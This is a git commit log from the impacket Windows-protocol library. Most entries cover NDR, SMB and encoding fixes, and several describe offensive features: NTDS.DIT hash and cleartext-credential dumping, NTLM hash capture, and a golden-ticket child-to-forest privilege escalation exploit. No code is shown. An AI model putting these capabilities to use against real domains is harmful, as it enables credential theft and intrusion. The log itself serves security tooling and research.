    Small change to decide when to disconnect a DCE connection

commit 616bdf952d7cc299d1dd4585ed4b6452fcb7f8bc
Merge: 0999641a 264ac838
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 11:43:27 2015 -0300

    Merge branch 'master' of https://github.com/sjitech/impacket into sjitech-master

commit 264ac838c5c75a28cddaa5956c8e68fa419ff496
Author: q <osexp2003@gmail.com>
Date:   Tue Dec 15 09:50:05 2015 +0900

    let hept_lookup use existing SMB transport if specified, instead of always use TCP 135 port

commit 0999641aea3633c3a80407424178b2496ab4fc4f
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 14 14:36:32 2015 -0300

    Extending NdTable's data to more than 16 properties
    
    * NdTable is an encoded table that represents the behavior of the default value of properties in a CIM class. ([MS-WMIO] Section 2.2.26
    * The implementation I had was limiting the amount of parameters to pack when marshalling a class/instance to 16.
    * Now it should support the amount of properties defined by the class.
    * I'm still not sure tho, the encoding I'm using is the right one. [MS-WMIO] does not specify this.
    * Found this while addressing https://github.com/CoreSecurity/impacket/issues/117

commit e13e0baa1ac9973eb4df85e6be0af2a2e975bdd3
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 3 10:09:58 2015 -0300

    DCOM INTERFACE Connections are not reused by different threads
    
    * Reusing them could trigger out of sync issues. Instead, a new connection is created by each thread.
    * This aims to fix https://github.com/CoreSecurity/impacket/issues/114

commit 1f8370e56b01cb183dee03e2a150302810a81925
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 30 15:49:07 2015 -0300

    Applying @jammer3d patch to fix https://github.com/CoreSecurity/impacket/issues/108
    
    Thanks and sorry for the delay!

commit 5851bd0cb903a91db0db8d225ee85be8cf2b734d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 26 14:55:19 2015 -0300

    Applying @0xsauby fix for password with '@' to the rest of the example scripts

commit f1d5337aae359615aa891fa2f83d49ad349540de
Merge: 836463be 6913c132
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 26 14:48:46 2015 -0300

    Merge pull request #112 from 0xsauby/master
    
    Broken auth, thanks @0xsauby!

commit 6913c1327005cc49067f2974b9d7c95046d0d15a
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:52:20 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 827a5594bf00ab54d447fc7b793c4165a15885c3
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:51:17 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit df661f4c145dbc3d861fce222d931446f602e8b6
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:48:27 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 6e4a78a33d502ebd23fb5f6b27c281179a5d6fd1
Merge: 86c07438 97f0412f
Author: 0xsauby <saurabh.harit@gmail.com>
Date:   Fri Nov 20 02:37:47 2015 -0500

    Merge branch 'master' of https://github.com/0xsauby/impacket

commit 86c07438310d360156d14c2c0edbd04dcd772531
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:19:15 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) will break auth.

commit 97f0412f3e0a658703fd33e5dd6111d40cb191b4
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:19:15 2015 -0500

    Fixed the issue where the password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 836463be6bf19c6e2207d054153570cb112ab42a
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 4 11:40:24 2015 -0300

    Default `SMBConnection.readFile()` to a single SMB call attempt
    
    * That means it cannot be guaranteed all the bytes requested will be read
    * I'll leave it this way until I figure out some incompatibilities with other use cases (e.g. psexec)

commit f544da0e78af708e45c20af6ae7f450ed773e473
Merge: 3e5f763e 1677bcfc
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:54:02 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 3e5f763e55ed884e841aeeea93fbe277269e7123
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:49:35 2015 -0300

    SMBConnection.readFile() now tried to read the amount specified by bytesToRead parameter
    
    * Before, if `bytesToRead` was greater than the protocol's `MaxReadSize` buffer
    (dependant on the server's configuration), it would only read that amount of bytes.
    Now it will call `read_andx`() many times until it reached EOF or read all the bytes asked.
    * See https://github.com/CoreSecurity/impacket/issues/94

commit 1677bcfc7cdc1af264a2a970a9878063e95b8934
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:49:35 2015 -0300

    SMBConnection.readFile() now tried to read the amount specified by bytesToRead parameter
    
    * Before, if `bytesToRead` was greater than the protocol's `MaxReadSize` buffer
    (dependant on the server's configuration), it would only read that amount of bytes.
    Now it will call `read_andx`() many times until it reached EOF or read all the bytes asked.

commit 97cb9791326304d7ec6bd1d4c47a7df11950af75
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:35:40 2015 -0300

    Adding getIOCapabilities() method, used by SMBConnection object

commit ecb7981993066968d61907e5f723f449f378796e
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 12:27:45 2015 -0300

    No need to specify anything when calling getNTLMSSPType1
    
    * Less prone to encoding errors.

commit c960a8d031280cf07305bd3e28b1df7aec43e94f
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 12:07:53 2015 -0300

    Encoding domain field using utf-16le, as specified in the flags field.
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/107

commit 4da024267f99b20f853d771697c57580195b91e0
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 2 13:45:06 2015 -0300

    Fix for https://github.com/CoreSecurity/impacket/issues/106

commit 35ff60efb14d1259a250d766d7663a90e0419a54
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 2 10:08:30 2015 -0300

    Extra checks when stripping leading '/'
    
    * Well.. let's verify there's a '/' there ;)

commit ad215d32df3ad21ebfa6086f20c236ecd17f3842
Merge: b6716a0a a45ff242
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 29 10:45:39 2015 -0300

    Merge branch 'scriptjunkie-ntlmv1fallback'
    
    Merging @scriptjunkie PR adding fallback parameter to SMB object. (See https://github.com/CoreSecurity/impacket/issues/102)
    
    thanks!

commit a45ff2426c39b9a90364bde02e40f2e36f369f21
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 29 09:46:23 2015 -0300

    Adding ntlmFallback parameter to SMBConnection.login()
    
    * If True it will try NTLMv1 authentication if NTLMv2 fails. Only available for SMBv1.
    * Defaults to True

commit 248aae3234d296605427000bd4d1beebd35f5022
Author: scriptjunkie <scriptjunkie@scriptjunkie.us>
Date:   Wed Oct 28 21:46:24 2015 -0500

    ntlmv2 enforcement option on SMB

commit b6716a0a164c1636fb578e6232320e903e1ab55d
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 25 19:19:13 2015 -0300

    Cosmetic changes

commit 5842d99d7432df94f5adb006e09ab93485591d5e
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 22 15:17:53 2015 -0300

    Whenever -resumefile is specified, that filename is also used to keep updating the session state after resuming.
    
    * Why? If for some reason the connection is closed again (or you Ctr-C the script) the session
    state will be saved in the same file provided. So, in order to resume the session just execute
    the script again with the same parameters. Should be easier.

commit bc25c967d9f062a1445cfaa529286c1e32b187c7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 21 15:16:16 2015 -0300

    Fixing raise misuse

commit f4be4a6844d04cd3d5a30e851469f5f0a639c881
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 21 08:53:05 2015 -0300

    Raising exception instead of returning None

commit 72b4ca5fdf873d44298d08a0c279f62e56d61047
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 20 12:40:09 2015 -0300

    Removing +x perm

commit 1a525ebb86b09929f37dab85c9bd58fcf8e49e5e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 20 11:16:50 2015 -0300

    Logging and exporting (optionally) captured NTLM/NTLMv2 encrypted hashes
    
    * Use -outputfile switch
    * Format is John the Ripper compatible
    * It will only log encrypted hashes after a successful authentication and before the actual attack (-e switch or default behaviour of dumping hashes).
    * Developed in the context of https://github.com/CoreSecurity/impacket/issues/100

commit d2abded84ae59594aaabf56311b91c36cd05ad42
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 16:34:15 2015 -0300

    Asks whether or not to keep the resume session file if you hit Ctrl-C during DRSUAPI

commit 004c350f2e704e92646bbc4e9b162cf42d42fce2
Merge: 5da9fae9 03500067
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 14:13:15 2015 -0300

    Merging @s0crat PR #98 adding NTDS.DIT multiple PEK support (https://github.com/CoreSecurity/impacket/pull/98)
    
    Thanks Pierre!
    
    Merge branch 's0crat-master'

commit 03500067d36eac515282ea26748596b2f2b05018
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 14:12:05 2015 -0300

    Minor cosmetic changes.
    
    * Just to align existing coding convention

commit 39a0919143d4fc1452e47bfcffdec88acba2bd4b
Merge: 5da9fae9 40d2e914
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 12:52:07 2015 -0300

    Merge branch 'master' of https://github.com/s0crat/impacket into s0crat-master

commit 40d2e914bdf53a9914f8bd6ae49b57899550ad50
Author: unknown <ptaiani041812@FR09285928D.dsk.eur.msd.world.socgen>
Date:   Tue Oct 13 16:51:01 2015 +0200

    Add support for multiple password encryption keys (PEK)

commit 5da9fae9c0cf77a55e57b805ac79a33e206a1067
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 17:46:35 2015 -0300

    Adding queryInfo()
    
    * Queries basic info about an opened file descriptor

commit 8fb3768940e01e74c57274c1748375507905e3be
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 17:09:44 2015 -0300

    If UNC is specified in connectTree, we do nothing for SMB1 connections

commit 098296b4ef67fd9281a04f04a7ca7bee0adb8e4c
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 16:57:04 2015 -0300

    query_file_info() returns a buffer based on the fileInfoClass parameter
    
    * This is to match smb3.queryInfo()

commit b9b85004e17819fdf302e1177a46c791f09c5c81
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 15:32:00 2015 -0300

    Minor fixes for resume capability when using -use-vss flag

commit 18a3c42927dadeec90fc83dc55cfa8614b961fdb
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 15:18:19 2015 -0300

    NTDS.DIT resuming capability also works with output files
    
    * If you specified -o xxxx and you suspend the script, everything will be saved.
    * If executed against with -resumefile, the output files will be appended with the new data
    * At the end, you should have the complete set of data in the output files regardless of
      how many times you resumed the script. (assuming you're using the same parameters).
    * This commit is in the context of #85

commit bbff44d1fc555e2de2ffeef1e9f7bb89afd2946b
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 09:18:16 2015 -0300

    Keep trying all the secret extraction approaches even if some of them fail.
    
    * You might be able to get hashes w/DRSUAPI and not being able to read SAM (e.g. using a DC machine account)

commit 10a5c954eea1f9c419ca5104f5619386fff7034c
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 2 20:29:30 2015 -0300

    Adding Primary:CLEARTEXT Property from supplementalCredentials attribute
    
    * [MS-SAMR] 3.1.1.8.11.5
    * Available both for DRSUAPI / VSS
    * When using -o a '<outputname>.ntds.cleartext' file is created

commit ae5b1dce67a3d3171b198b769fd89dc7b33892af
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 1 18:27:39 2015 -0300

    Adding resuming capability for NTDS.DIT dump (first try)
    
    * When dumping AD user's hashes/keys (DRSUAPI only) a session file will be created in the current directory
      having the latest SID successfuly processed. Filename is called `sessionresume_XXXXXXXX` (8 random chars)
    * If secretsdump finished succesfully, that file is automatically deleted
    * If the script is killed, or stopped (e.g. hitting Ctrl-C) that file will NOT be removed
    * You can resume the session by running secretsdump with the same parameters and adding the
    -resumefile <filename>parameter
    * You cannot disable secretsdump saving its state to a temporary file (would we want it?)
    * If you specify a resumefile for a different target, you're insane ;). I'm not checking that.
    * This commit is in the context of https://github.com/CoreSecurity/impacket/issues/85

commit c26f17fa00320cbd2ed7ea9fcefb3f0142aac8f4
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 28 12:24:02 2015 -0300

    Enabling dumping hashes/keys for WORKSTATION/SERVER/TRUST accounts by default
    
    * This was disabled in the past since I've got some decoding error reports. After
    all work in the NDR runtime I haven't seen any error again.
    * Please report an issue if some error pops up.

commit 02b083730bc207deacc939347b9495c297f7d14a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 24 10:42:32 2015 -0300

    Adding debug message when connecting to the KDC

commit 9d4ea5f312229cc7bcb07ed4e674015a9fb261f7
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 11:01:33 2015 -0300

    Forgot to disconnect the portmap connection.
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/93

commit 48a97f723a786fd3f0c65f921e9a6d40960e263b
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 11:00:30 2015 -0300

    Catching and showing error if lcd fails

commit 1a1e770bf89fac382195f308cdfb2a4daf76abf2
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 10:58:57 2015 -0300

    Adding cp437 encoding/decoding
    
    * Still not a final solution for will work much better on some foreign OSes

commit 2af5448b9b556e2071d01c507c2e0bdfe2e47883
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 22 21:43:45 2015 -0300

    Adjust referent data offset by 4
    
    * Since we're advancing 4 bytes first

commit fcbe4fd914250adf89d1d1bad178ae67e1de6a3e
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 18:01:28 2015 -0300

    Removing some debug info

commit e48e2d6c144c073706f9af12f569c0ac30dbf1b7
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 17:53:51 2015 -0300

    Explicitly changing the stdout encoding format if the script's output is redirected

commit 5ab22cf8c06b421f2518c571bad948170e2437c8
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 17:13:32 2015 -0300

    Trying give it a second try if there is a decoding issue happening
    
    * Especially important when dealing with international characters

commit c64a9c565f12668c523cf49e68195ea7445e0b3c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 16:23:25 2015 -0300

    Using sys.getfilesystemencoding() instead of sys.encoding.stdin

commit b3b0407acb8bd1bf5b2584b782d2d5013a5cfcf6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 16:09:34 2015 -0300

    Using sys.getfilesystemencoding() instead of sys.encoding.stdin
    
    * Works much better on Windows

commit fafbff2034c9930aaf1f9ea77521f6ccee3ae899
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 15:22:57 2015 -0300

    If the script's output is redirected

commit 1afb844b4b2460ecaf12c20bc99b36e8e6c82e98
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:12:33 2015 -0300

    Explicitly changing the stdout encoding format

commit 93b61a6c168daec0ca6dc6e761021ba5b3391612
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:06:38 2015 -0300

    Better way to detect no pwdLastSet was set

commit 594105211699835120b45bdcdc0335de96d02975
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:00:45 2015 -0300

    All files written are in utf-8 format.
    
    * Might have some consequences on Windows tho.

commit 879a2cf30bcf37632ad21eae76383dc935f88c83
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 17 18:32:52 2015 -0300

    Trying give it a second try if there is a decoding issue happening
    
    * Especially important when dealing with international characters

commit a893be5850b0abab92c9cb1493cc370550034dac
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 17 11:21:28 2015 -0300

    Adding optional -pwd-last-set switch for NTDS.DIT accounts output
    
    * Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
    * Added a display options group as part of the scripts options (this will likely grow)
    * Some code simplicity change to cope with so many switches

commit 0524363e88f11355b974ebb66a7002bb7b8b3653
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 16 13:38:38 2015 -0300

    Applying same modifications as https://github.com/CoreSecurity/impacket/commit/1f3cbff8df56344ba4d5552b0ddb8f3cb095194d to goldenPac and raiseChild

commit 1f3cbff8df56344ba4d5552b0ddb8f3cb095194d
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 16 08:55:01 2015 -0300

    Fixed error when targeting a 2012R2 DC with AD Recycle Bin enabled
    
    * DRSGetNCChanges() was returning ERROR_REVISION_MISMATCH
    * Problem was in the dwFlagsExt and dwExtCaps of the DRSBind() method
    * Thanks @carnal0wnage for reporting and helping debugging this issue.

commit 8f209f0731b0dff06ab5eb725e53aa8f0562ed68
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 15 22:45:23 2015 -0300

    Adding more debug info to help diagnosing issues

commit 488fddd1221fcf454e8bced7c9d034a1a40945fb
Author: Or Dagmi <or@digmi.org>
Date:   Sat Sep 12 15:15:31 2015 +0300

    Adding ERP and Country elements to Beacon

commit d46cb154e8dd2c1028e717a2e77059605a2ecfeb
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 11 14:39:46 2015 -0300

    We have to add some SMB flags just in case the original client did not
    
    * Why? needed for avoiding INVALID_PARAMETER when calling FIND_FIRST2

commit 37ebbbbb7d219edc099ab77b62b7855d24868956
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 11 13:47:57 2015 -0300

    Testing all DCs in domain and adding forest's enterprise admin group inside PAC

commit 501482862c7c8d561b2ee28c309cccd12328e8b1
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 18:41:56 2015 -0300

    Code optimization
    
    * Taking advantage of previous NDR.fromString() work done (https://github.com/CoreSecurity/impacket/commit/da05308c042c737d64311c336382ae99b25da1a5)

commit 5c6df1b20a488ef80c6b40784aa784b96d343529
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 18:32:54 2015 -0300

    Looping over the GetNCChanges until there's not more data
    
    * This test could take a lot of time to complete, be aware

commit 3cfe3912159be7c938a5eccd3da112e6e127391a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 17:31:39 2015 -0300

    Removing dup setArraySize() call

commit 6e25540f0d9e8a2ba875b5b0a37f677faf1ef25d
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 15:44:06 2015 -0300

    Code cleanup

commit c6d57a5aed6f3e8da119d2083a50d52762806ea1
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 12:44:16 2015 -0300

    Moving calcUnPackSize() into unpack()
    
    * Makes code way easier to read

commit da05308c042c737d64311c336382ae99b25da1a5
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 12:18:11 2015 -0300

    NDR fromString() now returning bytes processed
    
    * Instead of returning self. Makes things way easier. No need to have getFromStringSize() and arraySoFar.

commit 59af4903bc1ea3f1346a2fc6ea9177c85a8c68a6
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 8 20:36:07 2015 -0300

    Being consistent with what we put inside the try/except clauses

commit 6cebec00f7cf3f09d4112a8df5f021af7f912784
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:10:24 2015 -0300

    Adding TCPTransport test cases

commit 7c08162c4f508113eec10348c48caad5cad663a0
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:04:27 2015 -0300

    Adding NDR64 tests

commit 4c8470e20e74591e4478dd1327b720852bb76a1b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:00:00 2015 -0300

    Adding the NDR64 testcases. Working now

commit 9b1a71443267f561ecd581684ab8fcd51f2a23a4
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:28:28 2015 -0300

    Adding more test cases to this file

commit 9e98a6803ada9ff1aff3437c2bb8ae404b3de145
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:22:23 2015 -0300

    Wrong branch

commit 144c1f81f604b9c71f5429661c1ee790a8b28f93
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 31 09:19:23 2015 -0300

    Adding NDR64 tests

commit 39c641478d075021e4b3334672868c0a9daef850
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:52:36 2015 -0300

    NDR Runtime test cases

commit c0c233b17e8a8908cae013e7b9caaf685ee584fc
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:52:15 2015 -0300

    Adding new testcase for GetNCChanges

commit 7ee5bf3138f85a8b2c48c54742579371ab5fb45a
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:48:16 2015 -0300

    debug attribute not used anymore

commit 8a265c0c4885c8b5cd2d5b4f8465646e5ebbb68c
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:47:40 2015 -0300

    Removing some debug messages

commit 15d75ec8a315b0c2570b72a594fdb109fba50bc5
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:33:31 2015 -0300

    getArraySize() also used in NDRSTRUCT.fromString()

commit 8d53ff2b6aba4b829a0fabe34e73039145ca1c1e
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 19:44:24 2015 -0300

    Not counting arraySize when dealing with NDRUniConformantVaryingArray.
    
    * MaximumCount could be larger than ActualCount

commit ce404d4a791aec3e744fed9732f98a3a472af3df
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:44:11 2015 -0300

    With the new NDR runtime we don't need this workaround fix

commit 6dd24d89592e2691097540bf0aca05497332bcf3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:33:39 2015 -0300

    Adding UNKNOWNDATA data type

commit fc2bdb8f3ba7f2d882cb9ea784d636f6715eeaa0
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:10:57 2015 -0300

    Enclosing more statements inside try clause

commit b14a7e35af95006d294f29400857a38e18df1c5b
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 16:59:52 2015 -0300

    Missed alignment before the size data

commit 95844c75b3a8aea1ad9a28c048a091b2c80195b3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 16:22:32 2015 -0300

    Adding getArrayMaximumSize() as a way to manage those situations where MaximumCount != ActualCount

commit 2824cd79fff937c06d6306affb3dd6ee1fc9e188
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 14:24:04 2015 -0300

    Replacing code that is already in NDRCONSTRUCTEDTYPE.getArraySize()

commit abf6511655e5aa0562ab1f84621abb0a85ad355c
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 13:31:31 2015 -0300

    NDRUniConformantArray and NDRUniConformantVaryingArray don't unpack arraySize anymore
    
    * This will need to be done manually and later on update using setArraySize/getArraySize
    * Why? It is more straighforward since the arraySize in structures is always at the begining of
    the structure rather than before the array stream. We had to make some calculations that are prone
    to fail.
    Still not all test cases working tho.

commit 2362e6ae03aae5b3224960bece598d4810e0b73d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 15:36:54 2015 -0300

    Leaving a single getData/fromString for most of the arrays

commit 8a8fa1691c79c3c6902b81a6a39de73f8de55da1
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 13:28:38 2015 -0300

    Added restrictions for packing/unpacking referent data from arrays

commit 74ced655f40729f9232f1715d4fb43d907e5f142
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:31:51 2015 -0300

    Aligning NDRUNION structure when packing/unpacking

commit de0807b5c0d942f86076a2d32d5a46e8fb98be3c
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 09:35:12 2015 -0300

    Adding getAlignment to SCMR handle structure

commit 51c7f2ab07f211fe149259a875645946e8b84454
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 08:57:15 2015 -0300

    Properly prepare the data buffer when dealing with a pointer to an array

commit 423645e04797e0e6a58c07029809b74f4d77f6fc
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 23:16:15 2015 -0300

    Checking arraySoFar inside NDRUniConformantVaryingArray.fromString()

commit 5acd135958aca30157394c7862f0b2656e232a18
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 22:00:59 2015 -0300

    Removing debug message

commit c303ab3ed85708eb1652576f20df0a0c4fca6589
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 21:42:00 2015 -0300

    Adding the now required getAlignment to string structures

commit 71fdd7e7eb313c00321b81b3d05c580c768223ad
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 19:15:45 2015 -0300

    Adding alignment for SAMR_HANDLE

commit 09c325bebd0b71b3bd0d80ea876497b83572b6f8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 19:09:36 2015 -0300

    Code cleanup + NDRPOINTER strict alignment
    
    * There's some code I won't use for now. If I need it again, I'll rewrite

commit b57e4b515e3fcd1c84ac029aca0a6376d8f8c490
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:44:05 2015 -0300

    Code Cleanup

commit e3a6d266a650ceb7ba4ed89bdaaea32f67171027
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:30:45 2015 -0300

    Code cleanup
    
    * Removing fromStringOld and calculatePadOld
    * Moving calcPackSize and calcUnpackSize array stuff into NDRCONSTRUCTEDTYPE. Not ideal yet but much better
    than having it inside NDR

commit a50f7ff2f1028b1094dc74069f2df4c5da3342ef
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:17:22 2015 -0300

    Code cleanup
    
    * Moving isUnion()/isPointer() to NDRCONSTRUCTEDTYPES
    * Removing array packing from NDR.pack(), was already in NDRArray.pack()

commit e63345bc0cac03a1d70bfe8a4e9b480bd3cb00ee
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:12:47 2015 -0300

    Adding a NDRCONSTRUCTEDTYPE class
    
    * Helpful to better organize methods
    * NDR class is only meant for NDR primitive date types
    * Changes some interfaces data types from NDR->NDRSTRUCT

commit 72264b8b8a0c4016f1d12e620366756911288a1d
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 15:56:26 2015 -0300

    Moving NDRCALL down in the file

commit 8c4601c2708c4355eaf6074f0afcadb6f4a27e44
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 15:23:33 2015 -0300

    More padding adjustements
    
    * NDR trailing GAP padding disabling for now

commit 756043352acfd2d0b7dce9b5aa54179f918f489f
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 13:23:13 2015 -0300

    Forgot changing also the data available

commit f44a9eafaa165d8462073110ba192a4c704db3e9
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 13:16:31 2015 -0300

    Checking NULL Pointer correctly for NDR64

commit a1dfdbbf4b6edecd7cb5cc0b7fecead301f1a4a8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 12:22:26 2015 -0300

    More code cleanup
    
    * Removed CONSISTENCYCHECK code
    * calculatePad redefined
    * NDR is our Primitive Data class
    * array pack/unpack moved to NDRArry.pack() NDRArray.unpack()
    * Alignment is being done only in the places needed
    * getDataArray renamed to getData
    * fromStringArray renamed to fromString
    * NDRPOINTER needs to align itself before moving on

commit 26e9d08e455e622bf0a25670d24ca4cfc70d19b7
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 24 18:42:44 2015 -0300

    Removing unused variables and code cleanup
    
    * self.data, self.rawData
    * switching to @staticmethod for isNDR, isPointer and isUnion
    * Removing some debug messages and changed expections

commit 5a81fa918322b1fb0a84b2fe11cff06ff77501bf
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 8 17:58:38 2015 -0300

    Updated doc

commit de53731514e6d78dbdae4f2c35eac1e08950ceb0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:24:41 2015 -0300

    Fixed typo

commit 8f2499e94a73be7148abf3f8d153c593bb4d9244
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:22:55 2015 -0300

    Disabling some test cases that are dangerous against a DC.
    
    Use them at your own risk.

commit 46c2dffbda9d83af9bc11f8d982bee5728bdfebd
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:30:40 2015 -0300

    NDR64 for drsuapi still not working

commit 9494c2693f7c5e3f5029791c4d8fc4c80222ebbe
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:27:01 2015 -0300

    Adding extra debug information

commit be5ad45851ced0859bbf6fa29bf69afa3bc0db73
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:05:43 2015 -0300

    Checking DRSCrackNames's rItems status answer as well to verify everything is ok
    
    * Thanks @gentilkiwi for pointing this out

commit f8959be0354857e1658e34e183be05b04c4e49eb
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 3 20:37:19 2015 -0300

    Reliability fixes
    
    1) Using getDNSMachineName() instead of getMachineName() so we have higher chances to resolve the target machines
    2) If the ticket we're making golden doesn't have an ExtraSid already, we need to state ExtraSids are being present in validationInfo['Data']['UserFlags'].
    3) 'Administrator' is not always the name for S-1-5-21-domain-500. Shame on me and all non-us folks
    Thanks @gentilkiwi for your feedback!

commit 3062d8d44e07bec08ede11022815f961e1a46347
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 3 18:55:37 2015 -0300

    Child domain to forest privilege escalation exploit
    
    This script implements a child-domain to forest privilege escalation
    as detailed by Sean Metcalf at https://adsecurity.org/?p=1640. We will
    be (ab)using the concept of Golden Tickets and ExtraSids researched and implemented
